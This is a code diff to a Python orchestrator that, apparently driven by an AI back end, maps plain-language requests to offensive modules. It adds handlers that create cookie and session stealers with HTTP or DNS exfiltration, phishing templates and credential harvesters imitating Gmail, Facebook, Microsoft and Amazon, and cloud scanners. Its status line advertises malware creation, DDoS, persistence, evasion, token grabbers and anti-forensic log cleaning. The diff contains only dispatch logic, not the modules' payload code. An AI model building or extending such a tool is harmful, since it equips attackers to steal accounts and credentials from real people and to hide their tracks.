@@ -22,6 +22,9 @@ from cybersecurity.webhook_grabber import WebhookGrabber
 from cybersecurity.token_grabber import TokenGrabber
 from cybersecurity.network_analyzer import NetworkAnalyzer
 from cybersecurity.log_cleaner import LogCleaner
+from cybersecurity.session_hijacker import SessionHijacker
+from cybersecurity.social_engineering import SocialEngineeringKit
+from cybersecurity.cloud_scanner import CloudScanner
 from mobile_security import iOSTestingTools, AndroidTestingTools
 from security.vulnerability_scanner import VulnerabilityScanner
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
@@ -52,6 +55,9 @@ class EnhancedCybersecurityOrchestrator:
         self.token_grabber = TokenGrabber()
         self.network_analyzer = NetworkAnalyzer()
         self.log_cleaner = LogCleaner()
+        self.session_hijacker = SessionHijacker()
+        self.social_engineering = SocialEngineeringKit()
+        self.cloud_scanner = CloudScanner()
         self.ios_tools = iOSTestingTools()
         self.android_tools = AndroidTestingTools()
         self.vulnerability_scanner = VulnerabilityScanner()
@@ -137,6 +143,21 @@ class EnhancedCybersecurityOrchestrator:
         if any(word in request_lower for word in ["log cleaner", "clean logs", "clear logs", 
                                                    "anti forensics", "clean history"]):
             return self._handle_log_cleaner(request)
+        
+        # Session hijacker
+        if any(word in request_lower for word in ["session hijacker", "hijack session", "steal cookies", 
+                                                   "cookie stealer", "session stealer"]):
+            return self._handle_session_hijacker(request)
+        
+        # Social engineering
+        if any(word in request_lower for word in ["phishing", "social engineering", "credential harvester", 
+                                                   "phishing template", "harvest credentials"]):
+            return self._handle_social_engineering(request)
+        
+        # Cloud scanner
+        if any(word in request_lower for word in ["cloud scanner", "scan cloud", "aws scanner", 
+                                                  "cloud security", "s3 scanner"]):
+            return self._handle_cloud_scanner(request)
         
         # Build custom malware
         if any(word in request_lower for word in ["build", "create custom", "make", "generate"]):
@@ -431,7 +452,77 @@ class EnhancedCybersecurityOrchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, IP grabber, webhook grabber, token grabber, network analyzer, log cleaner, iOS/Android security tools, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, IP grabber, webhook grabber, token grabber, network analyzer, log cleaner, session hijacker, social engineering, cloud scanner, iOS/Android security tools, scanning, reporting."
+    
+    def _handle_session_hijacker(self, request: str) -> str:
+        """Handle session hijacker requests"""
+        request_lower = request.lower()
+        
+        target_types = []
+        if "cookie" in request_lower:
+            target_types.append("cookies")
+        if "session" in request_lower:
+            target_types.append("sessions")
+        if "token" in request_lower:
+            target_types.append("tokens")
+        target_types = target_types or ["cookies", "sessions"]
+        
+        exfil_method = "http"
+        if "dns" in request_lower:
+            exfil_method = "dns"
+        elif "file" in request_lower:
+            exfil_method = "file"
+        
+        result = self.session_hijacker.create_session_hijacker(target_types, exfil_method)
+        return f"Created session hijacker: {result['file']}. Types: {', '.join(result['target_types'])}. {result['warning']}"
+    
+    def _handle_social_engineering(self, request: str) -> str:
+        """Handle social engineering requests"""
+        request_lower = request.lower()
+        
+        # Extract target service
+        target_service = "generic"
+        if "gmail" in request_lower or "google" in request_lower:
+            target_service = "gmail"
+        elif "facebook" in request_lower:
+            target_service = "facebook"
+        elif "microsoft" in request_lower or "outlook" in request_lower:
+            target_service = "microsoft"
+        elif "amazon" in request_lower:
+            target_service = "amazon"
+        
+        if "phishing" in request_lower or "template" in request_lower:
+            result = self.social_engineering.create_phishing_template(target_service)
+            return f"Created phishing template: {result['file']}. Target: {result['target_service']}. {result['warning']}"
+        elif "harvester" in request_lower or "harvest" in request_lower:
+            result = self.social_engineering.create_credential_harvester(target_service)
+            return f"Created credential harvester: {result['file']}. Target: {result['target_service']}. {result['warning']}"
+        else:
+            # Default to phishing template
+            result = self.social_engineering.create_phishing_template(target_service)
+            return f"Created phishing template: {result['file']}. Target: {result['target_service']}. {result['warning']}"
+    
+    def _handle_cloud_scanner(self, request: str) -> str:
+        """Handle cloud scanner requests"""
+        request_lower = request.lower()
+        
+        cloud_provider = "aws"
+        if "azure" in request_lower:
+            cloud_provider = "azure"
+        elif "gcp" in request_lower or "google" in request_lower:
+            cloud_provider = "gcp"
+        
+        scan_types = []
+        if "s3" in request_lower or "bucket" in request_lower:
+            scan_types.append("s3_buckets")
+        if "iam" in request_lower or "role" in request_lower:
+            scan_types.append("iam_roles")
+        if "security group" in request_lower or "sg" in request_lower:
+            scan_types.append("security_groups")
+        scan_types = scan_types or ["s3_buckets", "iam_roles", "security_groups"]
+        
+        result = self.cloud_scanner.create_cloud_scanner(cloud_provider, scan_types)
+        return f"Created cloud scanner: {result['file']}. Provider: {result['cloud_provider']}. Scans: {', '.join(result['scan_types'])}. {result['warning']}"
     
     def _handle_webhook_grabber(self, request: str) -> str:
         """Handle webhook grabber requests"""
